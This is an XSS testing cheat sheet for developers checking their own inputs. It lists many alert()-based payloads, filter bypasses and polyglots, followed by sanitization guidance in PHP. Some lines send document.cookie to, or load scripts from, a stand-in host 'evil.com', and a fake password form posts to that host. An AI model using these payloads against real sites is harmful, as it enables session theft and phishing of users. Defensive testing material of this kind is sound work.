# XSS Testing Payloads

Use these payloads to test all user inputs in your application for XSS vulnerabilities.

## Quick Test Payloads

Start with these basic payloads to quickly identify vulnerable inputs:

```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
```

---

## 1. Script Tag Variations

```html
<script>alert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script src="https://evil.com/xss.js"></script>
<script>document.location='https://evil.com/?c='+document.cookie</script>
<script/src="https://evil.com/xss.js"></script>
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

### Case Variations
```html
<SCRIPT>alert('XSS')</SCRIPT>
<ScRiPt>alert('XSS')</ScRiPt>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

### With Encoding
```html
<script>alert('XSS')</script>
<script>alert('XSS')</script>
```

---

## 2. Event Handler Payloads (Most Common Bypass)

### Image Tag
```html
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src=x onload=alert('XSS')>
<img src="valid.jpg" onmouseover="alert('XSS')">
```

### Body Tag
```html
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<body onfocus=alert('XSS')>
```

### SVG Tag
```html
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
<svg onload="alert('XSS')">
<svg><script>alert('XSS')</script></svg>
```

### Input Tag
```html
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
<input type="text" value="" onfocus="alert('XSS')" autofocus>
```

### Div/Span
```html
<div onmouseover="alert('XSS')">Hover me</div>
<div onmouseenter="alert('XSS')">Hover me</div>
<span onmouseover=alert('XSS')>Hover</span>
```

### Other Tags
```html
<marquee onstart=alert('XSS')>
<video><source onerror="alert('XSS')">
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe onload=alert('XSS')>
<object data="x" onerror=alert('XSS')>
<embed src=x onerror=alert('XSS')>
<form><button formaction="javascript:alert('XSS')">Click</button></form>
```

---

## 3. JavaScript URL Schemes

```html
<a href="javascript:alert('XSS')">Click me</a>
<a href="javascript:alert('XSS')">Click</a>
<a href="  javascript:alert('XSS')">Click</a>
<a href="jAvAsCrIpT:alert('XSS')">Click</a>
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')">
<form action="javascript:alert('XSS')"><input type="submit">
```

---

## 4. Data URL Schemes

```html
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click</a>
<object data="data:text/html,<script>alert('XSS')</script>">
<iframe src="data:text/html,<script>alert('XSS')</script>">
```

---

## 5. VBScript (Legacy IE)

```html
<a href="vbscript:msgbox('XSS')">Click</a>
<img src=x onerror="vbscript:msgbox('XSS')">
```

---

## 6. CSS-Based XSS

```html
<div style="background:url('javascript:alert(1)')">
<div style="width:expression(alert('XSS'))">
<style>@import 'javascript:alert("XSS")';</style>
<link rel="stylesheet" href="javascript:alert('XSS')">
```

---

## 7. HTML Injection / Phishing

```html
<form action="https://evil.com/steal"><input name="password" type="password"><input type="submit"></form>
<a href="https://evil.com">Click to login</a>
<meta http-equiv="refresh" content="0;url=https://evil.com">
```

---

## 8. Filter Bypass Techniques

### Null Bytes
```html
<scri%00pt>alert('XSS')</script>
<img src=x o%00nerror=alert('XSS')>
```

### Unicode/Encoding
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
\u003cscript\u003ealert('XSS')\u003c/script\u003e
<img src=x onerror=\u0061lert('XSS')>
```

### Double Encoding
```html
%253Cscript%253Ealert('XSS')%253C/script%253E
```

### Breaking Tags
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<<script>script>alert('XSS')</<script>/script>
```

### Whitespace Variations
```html
<img/src=x/onerror=alert('XSS')>
<img	src=x	onerror=alert('XSS')>
<img
src=x
onerror=alert('XSS')>
```

### Without Quotes/Parentheses
```html
<img src=x onerror=alert`XSS`>
<img src=x onerror=alert&lpar;'XSS'&rpar;>
<script>alert`XSS`</script>
```

---

## 9. Polyglot Payloads

These work in multiple contexts (HTML, JS, attribute):

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>

javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

<img src=x id=alert(1) onerror=eval(id)>
```

---

## 10. Context-Specific Payloads

### Inside HTML Attribute (quoted)
```html
" onmouseover="alert('XSS')
" onfocus="alert('XSS')" autofocus="
'><script>alert('XSS')</script>
" onclick=alert('XSS')//
```

### Inside JavaScript String
```javascript
';alert('XSS');//
\';alert(\'XSS\');//
</script><script>alert('XSS')</script>
```

### Inside URL Parameter
```
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
"><script>alert('XSS')</script>
```

### Inside JSON
```json
{"name":"</script><script>alert('XSS')</script>"}
{"name":"\"};alert('XSS');//"}
```

---

## Testing Checklist

Test each input field with these categories:

| Category | Priority | Test Payload |
|----------|----------|--------------|
| Script tags | High | `<script>alert(1)</script>` |
| Event handlers | High | `<img src=x onerror=alert(1)>` |
| SVG | High | `<svg onload=alert(1)>` |
| JavaScript URLs | High | `javascript:alert(1)` |
| Data URLs | Medium | `data:text/html,<script>alert(1)</script>` |
| Encoded payloads | Medium | `<script>alert(1)</script>` |
| Case variations | Medium | `<ScRiPt>alert(1)</ScRiPt>` |
| Filter bypasses | Low | `<scr<script>ipt>alert(1)</script>` |

---

## Expected Behavior

When testing, the input should be:

1. **Sanitized**: Dangerous content stripped/removed
2. **Encoded**: Special chars converted to HTML entities (`<` → `&lt;`)
3. **Rejected**: Return validation error for malicious input

### Safe Output Examples

| Input | Safe Output (Encoded) | Safe Output (Stripped) |
|-------|----------------------|------------------------|
| `<script>alert(1)</script>` | `&lt;script&gt;alert(1)&lt;/script&gt;` | `alert(1)` |
| `<img onerror=alert(1)>` | `&lt;img onerror=alert(1)&gt;` | `` |
| `Hello <b>World</b>` | `Hello &lt;b&gt;World&lt;/b&gt;` | `Hello World` |

---

## PHP Sanitization Functions

```php
// Option 1: Encode all HTML (safest for display)
$safe = htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');

// Option 2: Strip all HTML tags
$safe = strip_tags($input);

// Option 3: HTMLPurifier (allows safe HTML subset)
$safe = Purifier::clean($input, 'config_name');
```

---

## Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
